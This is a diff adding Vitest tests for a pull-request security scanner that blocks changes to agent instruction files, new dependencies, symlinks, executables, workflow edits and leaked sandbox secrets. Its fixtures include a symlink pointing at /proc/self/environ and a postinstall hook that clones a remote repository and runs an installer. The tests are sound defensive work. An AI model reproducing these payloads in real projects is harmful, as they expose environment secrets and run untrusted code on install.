@@ -1,5 +1,35 @@
 import { describe, expect, it } from 'vitest'
-import { scanPullSecurity } from './security.ts'
+import type { GitHubClient } from '../../scripts/maintainer/github.ts'
+import {
+  auditPullSecurity,
+  findNewDependencies,
+  scanGeneratedDiff,
+  scanPullSecurity,
+} from './security.ts'
+
+function packageClient(before: string, after: string): GitHubClient {
+  return {
+    graphql() {
+      throw new Error('not used')
+    },
+    async rest(method, path) {
+      if (method !== 'GET') throw new Error(`unexpected ${method} ${path}`)
+      if (path.includes('ref=base-sha')) {
+        return {
+          encoding: 'base64',
+          content: Buffer.from(before).toString('base64'),
+        }
+      }
+      if (path.includes('ref=head-sha')) {
+        return {
+          encoding: 'base64',
+          content: Buffer.from(after).toString('base64'),
+        }
+      }
+      throw new Error(`unexpected ${method} ${path}`)
+    },
+  }
+}
 
 describe('scanPullSecurity', () => {
   it('is clean for a normal source patch', () => {
@@ -11,6 +41,146 @@ describe('scanPullSecurity', () => {
         },
       ]),
     ).toEqual({ ok: true, reasons: [] })
+  })
+
+  it.each([
+    'AGENTS.md',
+    '.agents/skills/review/SKILL.md',
+    '.claude/settings.json',
+    '.grok/config.toml',
+    '.gitmodules',
+  ])('blocks sensitive path %s', (path) => {
+    expect(
+      scanPullSecurity([{ path, patch: '@@ -1 +1 @@\n-old\n+new\n' }]),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        `${path}: changes security-sensitive instructions or automation`,
+      ],
+    })
+  })
+
+  it('blocks a file whose patch is unavailable', () => {
+    expect(
+      scanPullSecurity([{ path: 'packages/ai/src/large.ts', patch: null }]),
+    ).toEqual({
+      ok: false,
+      reasons: ['packages/ai/src/large.ts: patch unavailable'],
+    })
+  })
+
+  it('blocks a rename from a sensitive path', () => {
+    expect(
+      scanPullSecurity([
+        {
+          path: 'docs/old-agent-rules.md',
+          previousPath: 'AGENTS.md',
+          patch: '@@ -1 +1 @@\n-old\n+new\n',
+        },
+      ]),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        'AGENTS.md: changes security-sensitive instructions or automation',
+      ],
+    })
+  })
+
+  it('blocks added dependencies in package.json', () => {
+    expect(
+      findNewDependencies(
+        '{"dependencies":{"react":"19.0.0"}}',
+        '{"dependencies":{"react":"19.1.0","left-pad":"1.3.0"}}',
+      ),
+    ).toEqual(['left-pad'])
+  })
+
+  it('allows dependency version changes in package.json', () => {
+    expect(
+      findNewDependencies(
+        '{"dependencies":{"react":"19.0.0"}}',
+        '{"dependencies":{"react":"19.1.0"}}',
+      ),
+    ).toEqual([])
+  })
+
+  it('fails the audit when package.json adds a dependency', async () => {
+    const result = await auditPullSecurity(
+      packageClient(
+        '{"dependencies":{"react":"19.0.0"}}',
+        '{"dependencies":{"react":"19.0.0","left-pad":"1.3.0"}}',
+      ),
+      'TanStack/ai',
+      {
+        baseSha: 'base-sha',
+        headSha: 'head-sha',
+        headRepo: 'alice/ai',
+        files: [{ path: 'package.json', patch: '@@ -1 +1 @@\n-old\n+new' }],
+      },
+    )
+
+    expect(result).toEqual({
+      ok: false,
+      reasons: ['package.json: adds dependencies: left-pad'],
+    })
+  })
+
+  it('blocks a lockfile change without a package manifest change', async () => {
+    const result = await auditPullSecurity(
+      packageClient('{}', '{}'),
+      'TanStack/ai',
+      {
+        baseSha: 'base-sha',
+        headSha: 'head-sha',
+        headRepo: 'alice/ai',
+        files: [{ path: 'pnpm-lock.yaml', patch: '@@ -1 +1 @@\n-old\n+new' }],
+      },
+    )
+
+    expect(result).toEqual({
+      ok: false,
+      reasons: ['pnpm-lock.yaml: lockfile change has no package.json change'],
+    })
+  })
+
+  it('blocks a symlink reported by the Git tree', async () => {
+    const client: GitHubClient = {
+      graphql() {
+        throw new Error('not used')
+      },
+      async rest(method, path) {
+        if (method !== 'GET') throw new Error(`unexpected ${method} ${path}`)
+        if (path.includes('/git/trees/base-sha')) {
+          return { truncated: false, tree: [] }
+        }
+        if (path.includes('/git/trees/head-sha')) {
+          return {
+            truncated: false,
+            tree: [{ path: 'link', mode: '120000', type: 'blob' }],
+          }
+        }
+        throw new Error(`unexpected ${method} ${path}`)
+      },
+    }
+
+    expect(
+      await auditPullSecurity(client, 'TanStack/ai', {
+        baseSha: 'base-sha',
+        headSha: 'head-sha',
+        headRepo: 'alice/ai',
+        files: [
+          {
+            path: 'link',
+            status: 'added',
+            previousPath: null,
+            patch: '@@ -0,0 +1 @@\n+/proc/self/environ',
+          },
+        ],
+      }),
+    ).toEqual({
+      ok: false,
+      reasons: ['link: unsafe Git mode 120000'],
+    })
   })
 
   it('alerts on pull_request_target in a workflow', () => {
@@ -115,6 +285,89 @@ describe('scanPullSecurity', () => {
       reasons: [
         'packages/ai/package.json: "postinstall": "git clone ssh://git@host/repo /tmp/p && /tmp/p/install" fetches the network',
       ],
+    })
+  })
+})
+
+describe('scanGeneratedDiff', () => {
+  it('allows a normal source edit', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/src/chat.ts b/src/chat.ts\n--- a/src/chat.ts\n+++ b/src/chat.ts\n@@ -1 +1 @@\n-old\n+new\n',
+      ),
+    ).toEqual({ ok: true, reasons: [] })
+  })
+
+  it('blocks edits to security-sensitive files', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-old\n+new\n',
+      ),
+    ).toEqual({
+      ok: false,
+      reasons: ['.github/workflows/ci.yml: changes a workflow'],
+    })
+  })
+
+  it('blocks symlinks and binary patches', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/link b/link\nnew file mode 120000\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+target\ndiff --git a/image.png b/image.png\nGIT binary patch\n',
+      ),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        'link: creates or changes a symlink or submodule',
+        'image.png: contains a binary patch',
+      ],
+    })
+  })
+
+  it('blocks an existing symlink and a new executable', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/link b/link\nindex 1de5659..2ab19ae 120000\n--- a/link\n+++ b/link\n@@ -1 +1 @@\n-old\n+new\ndiff --git a/run.sh b/run.sh\nnew file mode 100755\n--- /dev/null\n+++ b/run.sh\n@@ -0,0 +1 @@\n+echo safe\n',
+      ),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        'link: creates or changes a symlink or submodule',
+        'run.sh: creates an executable file',
+      ],
+    })
+  })
+
+  it('blocks malformed diff headers', () => {
+    expect(scanGeneratedDiff('--- a/src/chat.ts\n+++ b/src/chat.ts\n')).toEqual(
+      {
+        ok: false,
+        reasons: ['generated diff has content before its first file header'],
+      },
+    )
+  })
+
+  it('blocks generated package manifest changes', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{"dependencies":{}}\n',
+      ),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        'package.json: generated edits cannot change package manifests',
+      ],
+    })
+  })
+
+  it('blocks a sandbox secret anywhere in a generated diff', () => {
+    expect(
+      scanGeneratedDiff(
+        'diff --git a/src/key.ts b/src/key.ts\n--- a/src/key.ts\n+++ b/src/key.ts\n@@ -0,0 +1 @@\n+secret-key\n',
+        ['secret-key'],
+      ),
+    ).toEqual({
+      ok: false,
+      reasons: ['generated diff contains a sandbox secret'],
     })
   })
 })
